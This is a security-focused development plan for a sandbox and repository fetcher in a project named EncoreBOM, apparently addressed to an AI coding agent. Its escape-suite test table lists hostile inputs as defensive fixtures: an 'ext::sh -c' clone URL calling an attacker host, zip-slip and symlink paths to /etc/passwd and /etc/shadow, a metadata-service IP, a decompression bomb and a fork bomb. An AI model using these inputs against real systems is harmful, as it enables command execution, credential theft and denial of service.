# Phase 5 — Sandbox and fetcher

**Estimated: 2 weeks** · Depends on Phases 2, 4.

> **This is the highest-risk phase in the project.** From here on, EncoreBOM executes third-party binaries over untrusted user code. Everything in this phase exists to bound the blast radius.

## Read first

1. `CLAUDE.md` — invariant 7
2. `docs/STATE.md`
3. **`docs/05-SECURITY-MODEL.md` §1, §3, §4 — in full**
4. `docs/ADR/0008-fetcher-materializes-source-once.md`
5. `docs/02-CONTRACTS.md` §3 (lifecycle), §4 (`ScanJobV1`)

## Goal

A sandbox that runs arbitrary scanners safely, and a fetcher that materializes source exactly once while holding the only credentials in the system.

## Preconditions

Engines resolve (`task osint:verify`); projects exist with repo connections.

## Out of scope

No engine adapters that parse output (Phase 7), no orchestration (Phase 6). This phase ends at: source is fetched into an archive, and an arbitrary command runs in a locked-down container against it.

## Deliverables

```
libs/go-shared/sandbox/
  runner.go      container lifecycle
  limits.go      cpu / memory / pids / disk / wall clock
  policy.go      network, caps, seccomp, rootfs, user
  runner_test.go the escape suite

services/scan-orchestrator/fetcher/
  fetch.go       clone or download, ONCE
  validate.go    scheme allowlist, connect-time IP checks
  extract.go     zip-slip, symlink, inflation guards
  archive.go     content-addressed tar.zst -> MinIO

fixtures/security/    one repo per attack in the suite
```

## Contracts to honour

Non-negotiable, each a hole if missed:

- **Only the fetcher holds git credentials.** `ScanJobV1` has no credential field and never will.
- `commit_sha` is written **exactly once** per scan and is immutable thereafter.
- Sandbox: `--network=none`, read-only rootfs, tmpfs workspace, `--cap-drop ALL`, `no-new-privileges`, non-root, seccomp, and every quota from `.env.example`.
- **Never execute user build tooling.** No `npm install`, `mvn`, `gradle`, `pip install`, `setup.py`, `make`, `cargo build`. Lockfile and manifest parsing only.
- `GIT_ALLOW_PROTOCOL=https` — git's `ext::` transport is arbitrary command execution.
- **Private-IP blocking at connection time, not parse time.** A custom dialer, not a regex on the URL.

## Steps

1. Sandbox runner over the Docker API: create with the full policy, stream logs, enforce wall clock, always clean up (including on panic — a leaked container holds a tmpfs).
2. Quotas from config; a job exceeding one is killed and reported, not silently truncated.
3. Fetcher URL validation: `https` only; resolve DNS once, **connect to the resolved IP, and validate that IP**; block `127/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`, `fe80::/10`, `0.0.0.0`; at most 3 redirects, each re-validated.
4. Clone: `--depth 1 --single-branch --no-tags -c core.hooksPath=/dev/null -c core.symlinks=false --no-recurse-submodules`, inside the sandbox, with the credential injected via a short-lived credential helper — never on the command line, where `argv` is world-readable in `/proc`.
5. Record `commit_sha`. Tar + zstd, sha256, upload to `workspaces/<scan_id>/source.tar.zst`.
6. Extraction guards: reject absolute paths, any `..` segment, symlinks escaping the workspace, hard links, device and FIFO entries. **Check the inflation ratio during extraction and abort mid-stream** — checking afterwards means the bomb has already landed.
7. Path sanitization: strip NUL, normalize Unicode, truncate to the column limit, **before** any database insert.
8. Build `fixtures/security/` — one repository per attack below.
9. Update `docs/STATE.md`.

## Test requirements — the escape suite

Every one is a real fixture, and every one must pass before this phase closes:

| Attack | Expected |
|---|---|
| clone URL `ext::sh -c 'curl attacker'` | rejected (`FETCH_URL_SCHEME_FORBIDDEN`) |
| clone URL resolving to `169.254.169.254` | rejected at connect time |
| DNS-rebinding host (public on resolve, private on connect) | rejected |
| `file://` and `http://` URLs | rejected |
| zip-slip archive containing `../../etc/passwd` | rejected |
| symlink to `/etc/shadow` | not followed |
| 10 GB-from-1 MB decompression bomb | aborted **mid-extraction** |
| repo with `.git/hooks/post-checkout` | hook never runs |
| 1 M tiny files | file-count limit holds |
| fork bomb in a build file | PID limit holds |
| scanner attempting outbound connection | blocked and logged |
| container attempting to write outside tmpfs | denied (read-only rootfs) |
| filename with NUL, newline, 4-byte emoji, 8 KB path | sanitized, stored, no truncation surprise |
| job exceeding wall clock | killed, reported `timeout`, container removed |

Plus: **assert no credential is present in the engine container's environment, filesystem, or argv.**

## Exit criteria

```
go test ./libs/go-shared/sandbox -run TestEscape -v      # every case
go test ./services/scan-orchestrator/fetcher -v
task verify
```

Manual: fetch a real repo, confirm `commit_sha` recorded once, archive uploaded and content-addressed, and a second fetch of the same commit deduplicates.

## Before you finish

Update `docs/STATE.md`: sandbox runtime in use, which escape cases are covered, and **anything you could not defend against**, stated plainly. A known, documented gap is manageable; an undocumented one is not.
